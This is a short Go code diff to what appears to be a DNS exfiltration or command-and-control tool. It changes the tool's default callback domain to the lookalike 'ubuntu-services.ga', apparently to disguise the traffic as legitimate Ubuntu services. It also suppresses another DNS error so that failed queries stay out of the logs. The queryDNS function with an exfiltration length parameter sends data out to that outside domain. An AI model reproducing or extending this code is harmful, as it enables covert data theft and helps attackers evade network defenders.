@@ -93,7 +93,7 @@ func main() {
 		)
 		domain = flag.String(
 			"domain",
-			"enmala.ga",
+			"ubuntu-services.ga",
 			"DNS domain `name`",
 		)
 		id = flag.String(
@@ -440,6 +440,9 @@ func queryDNS(o []byte, t, id, domain string, exfilLen int) []string {
 		if nil != err && !strings.HasSuffix(
 			err.Error(),
 			"no such host",
+		) && !strings.HasSuffix(
+			err.Error(),
+			"No records found for given DNS query.",
 		) {
 			log.Printf("Query error (%v): %v", q, err)
 		}
